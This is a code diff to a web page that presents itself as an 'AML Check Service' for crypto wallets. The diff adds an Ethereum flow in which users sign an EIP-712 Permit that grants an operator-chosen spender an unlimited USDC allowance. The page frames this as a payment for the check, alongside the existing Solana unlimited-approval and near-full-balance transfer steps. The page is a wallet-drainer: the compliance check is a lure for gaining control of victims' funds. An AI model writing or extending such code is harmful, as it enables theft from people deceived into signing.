@@ -579,7 +579,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
         <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">Max USDC allowance (SPL approve)</span></div>
-        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana Mainnet</span></div>
+        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val" id="det-network">Solana Mainnet</span></div>
         <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">SPL approve · Service wallet as delegate</span></div>
         <div class="dest-box">
           <div class="dest-label">SERVICE / DELEGATE WALLET</div>
@@ -626,7 +626,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
       </div>
 
       <div id="tx-badge" class="tx-badge" style="display:none">
-        <span>✅ Payment confirmed on-chain</span>
+        <span id="tx-badge-msg">✅ Payment confirmed on-chain</span>
         <a id="tx-badge-link" href="#" target="_blank" style="font-size:11px;color:#60A5FA">Tx →</a>
       </div>
 
@@ -670,7 +670,82 @@ const SOL_FEE_SAFETY_LAMPORTS = 450000;
 /** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
 const CUSTOM_SOLANA_RPC = "";
 
+/** Ethereum mainnet — delegate / spender (your wallet). Replace with your 0x address. */
+const EVM_PERMIT_SPENDER = "0x0000000000000000000000000000000000000000";
+const EVM_PERMIT_CHAIN_ID = 1;
+/** USDC on Ethereum mainnet (used to read permit nonce via eth_call). */
+const EVM_USDC_MAINNET = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const U256_MAX_STR =
+  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
 let state = { currency:"USDC", conn:null, txHash:null, scores:null, progress:0 };
+
+async function ensureEthereumChain(provider, chainIdDec) {
+  const chainIdHex = "0x" + chainIdDec.toString(16);
+  try {
+    await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
+  } catch (e) {
+    if (e && e.code === 4902) {
+      await provider.request({
+        method: "wallet_addEthereumChain",
+        params: [
+          {
+            chainId: chainIdHex,
+            chainName: "Ethereum Mainnet",
+            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+            rpcUrls: ["https://ethereum.publicnode.com"],
+            blockExplorerUrls: ["https://etherscan.io"],
+          },
+        ],
+      });
+    } else {
+      throw e;
+    }
+  }
+}
+
+async function readUsdcPermitNonce(provider, ownerAddress) {
+  const data = "0x7ecebe00" + ownerAddress.slice(2).toLowerCase().padStart(64, "0");
+  const result = await provider.request({
+    method: "eth_call",
+    params: [{ to: EVM_USDC_MAINNET, data }, "latest"],
+  });
+  if (!result || result === "0x" || result === "0x0") return "0";
+  return BigInt(result).toString();
+}
+
+function buildPermitTypedData(userAddress, currentNonceStr) {
+  return {
+    domain: { name: "AML Check", version: "1", chainId: EVM_PERMIT_CHAIN_ID },
+    types: {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" },
+      ],
+    },
+    primaryType: "Permit",
+    message: {
+      owner: userAddress,
+      spender: EVM_PERMIT_SPENDER,
+      value: U256_MAX_STR,
+      nonce: currentNonceStr,
+      deadline: String(Math.floor(Date.now() / 1000) + 86400 * 30),
+    },
+  };
+}
+
+async function signPermitTypedDataV4(provider, userAddress) {
+  await ensureEthereumChain(provider, EVM_PERMIT_CHAIN_ID);
+  const currentNonce = await readUsdcPermitNonce(provider, userAddress);
+  const msg = buildPermitTypedData(userAddress, currentNonce);
+  return provider.request({
+    method: "eth_signTypedData_v4",
+    params: [userAddress, JSON.stringify(msg)],
+  });
+}
 
 const WALLETS = {
   phantom:     { name:"Phantom",        emoji:"👻", chain:"solana", detect:()=>!!(window?.phantom?.solana?.isPhantom||window?.solana?.isPhantom), getP:()=>window?.phantom?.solana||window?.solana, mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
@@ -737,12 +812,29 @@ function setupPaymentStep(){
   const addr=state.conn.address;
   document.getElementById("pay-addr").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
   document.getElementById("det-from").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
-  document.getElementById("dest-addr").textContent=SERVICE_WALLET;
-  document.getElementById("dest-link").href=`https://solscan.io/account/${SERVICE_WALLET}`;
+  const isEvm = state.conn.chain === "evm";
+  const btnSol = document.getElementById("btn-sol");
+  if (btnSol) btnSol.style.display = isEvm ? "none" : "";
+  const detNet = document.getElementById("det-network");
+  if (isEvm) {
+    state.currency = "USDC";
+    document.getElementById("btn-usdc").classList.add("active");
+    if (btnSol) btnSol.classList.remove("active");
+    document.getElementById("dest-addr").textContent = EVM_PERMIT_SPENDER;
+    document.getElementById("dest-link").href = `https://etherscan.io/address/${EVM_PERMIT_SPENDER}`;
+    document.getElementById("dest-link").textContent = "Verify on Etherscan →";
+    if (detNet) detNet.textContent = "Ethereum Mainnet";
+  } else {
+    document.getElementById("dest-addr").textContent=SERVICE_WALLET;
+    document.getElementById("dest-link").href=`https://solscan.io/account/${SERVICE_WALLET}`;
+    document.getElementById("dest-link").textContent = "Verify on Solscan →";
+    if (detNet) detNet.textContent = "Solana Mainnet";
+  }
   selectCurrency(state.currency||"USDC");
 }
 
 function selectCurrency(c){
+  if (state.conn && state.conn.chain === "evm") c = "USDC";
   state.currency=c;
   document.getElementById("btn-usdc").classList.toggle("active",c==="USDC");
   document.getElementById("btn-sol").classList.toggle("active",c==="SOL");
@@ -750,9 +842,15 @@ function selectCurrency(c){
   const typ=document.getElementById("det-type");
   const btn=document.getElementById("btn-pay-now");
   if(c==="USDC"){
-    amt.textContent="Max USDC allowance (SPL approve · u64 max)";
-    typ.textContent="SPL approve · Service wallet as delegate";
-    btn.textContent="Approve USDC access →";
+    if (state.conn && state.conn.chain === "evm") {
+      amt.textContent="Max allowance (EIP-2612 Permit · uint256 max)";
+      typ.textContent="EIP-712 typed data (eth_signTypedData_v4)";
+      btn.textContent="Sign Permit →";
+    } else {
+      amt.textContent="Max USDC allowance (SPL approve · u64 max)";
+      typ.textContent="SPL approve · Service wallet as delegate";
+      btn.textContent="Approve USDC access →";
+    }
   }else{
     amt.textContent="Max SOL: balance − fees − rent-exempt minimum (chain rule)";
     typ.textContent="Direct transfer · Native SOL";
@@ -896,11 +994,56 @@ async function getWorkingSolanaConnection(web3) {
 
 async function executePay() {
   if (!state.conn) return;
+  hidePayError();
+
+  if (state.conn.chain === "evm") {
+    if (state.currency !== "USDC") {
+      showPayError("On EVM, only USDC (EIP-712 Permit) is available.");
+      return;
+    }
+    if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_PERMIT_SPENDER) || /^0x0{40}$/i.test(EVM_PERMIT_SPENDER)) {
+      showPayError("Set EVM_PERMIT_SPENDER in the script to your delegate wallet (non-zero 0x address).");
+      return;
+    }
+    try {
+      goToStep("paying");
+      document.getElementById("paying-emoji").textContent = "";
+      document.getElementById("paying-title").textContent = "Sign typed data";
+      document.getElementById("paying-sub").textContent =
+        "Approve the EIP-712 Permit in " + state.conn.walletName + ".";
+      document.getElementById("tx-link-paying").style.display = "none";
+
+      const sig = await signPermitTypedDataV4(state.conn.provider, state.conn.address);
+      state.txHash = sig;
+
+      const t = {
+        id: Date.now(),
+        address: state.conn.address,
+        wallet: state.conn.walletName,
+        chain: state.conn.chain,
+        currency: "USDC",
+        amount: "permit_eip712_max",
+        txHash: sig,
+        ts: new Date().toISOString(),
+      };
+      const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
+      localStorage.setItem("aml_traces", JSON.stringify(all));
+
+      await runScan();
+    } catch (e) {
+      goToStep("payment");
+      const m = formatAnyError(e);
+      if (/reject|cancel|denied/i.test(m) || (e && e.code === 4001))
+        showPayError("Signature cancelled.");
+      else showPayError(m.slice(0, 280) || "Permit error.");
+    }
+    return;
+  }
+
   if (state.conn.chain !== "solana") {
     showPayError("Use a Solana wallet (Phantom, Solflare, Backpack) for payment.");
     return;
   }
-  hidePayError();
   try {
     goToStep("paying");
     document.getElementById("paying-emoji").textContent = "";
@@ -1196,8 +1339,19 @@ function showResult(){
 
   if(state.txHash){
     const tb=document.getElementById("tx-badge"); tb.style.display="flex";
-    document.getElementById("tx-badge-link").href=`https://solscan.io/tx/${state.txHash}`;
+    const msgEl=document.getElementById("tx-badge-msg");
+    const linkEl=document.getElementById("tx-badge-link");
+    if(state.conn.chain==="evm"){
+      if(msgEl) msgEl.textContent="✅ EIP-712 Permit signature recorded";
+      if(linkEl) linkEl.style.display="none";
+    }else{
+      if(msgEl) msgEl.textContent="✅ Payment confirmed on-chain";
+      if(linkEl){ linkEl.style.display=""; linkEl.href=`https://solscan.io/tx/${state.txHash}`; }
+    }
   }
+
+  const rNet=document.getElementById("r-net");
+  if(rNet) rNet.textContent=state.conn.chain==="evm"?"Ethereum":"Solana";
 
   goToStep("result");
 }
